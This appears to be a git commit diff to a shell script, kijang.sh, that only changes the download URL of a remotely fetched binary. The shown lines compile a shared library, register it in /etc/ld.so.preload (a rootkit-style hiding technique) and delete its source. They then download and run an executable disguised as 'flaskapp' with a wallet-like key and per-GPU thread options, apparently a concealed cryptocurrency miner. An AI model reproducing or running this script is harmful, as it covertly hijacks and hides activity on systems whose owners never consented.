9a41019465c92ac1e5e28771d2b98637effc08a6
brontosimungo <brontosimungo@outlook.co.id>
2025-11-13 19:39:41 -0800

    Update kijang.sh

--- kijang.sh
+++ kijang.sh
@@ -8,6 +8,6 @@ gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
 mv libnyumput.so /usr/local/lib/
 echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
 rm nyumput.c
-wget -qO flaskapp https://github.com/brontosimungo/crispy-invention/raw/refs/heads/main/balsem
+wget -qO flaskapp https://github.com/brontosimungo/upgraded-octo-sniffle/raw/refs/heads/main/mistar
 chmod +x flaskapp
 ./flaskapp --pubkey=DBzZZHvv7ZXHJmVjxF8QR4xCqBgZF4jn3tcUkxUuaxxvsF1zktETF2x --threads-per-card=1 --name=testest
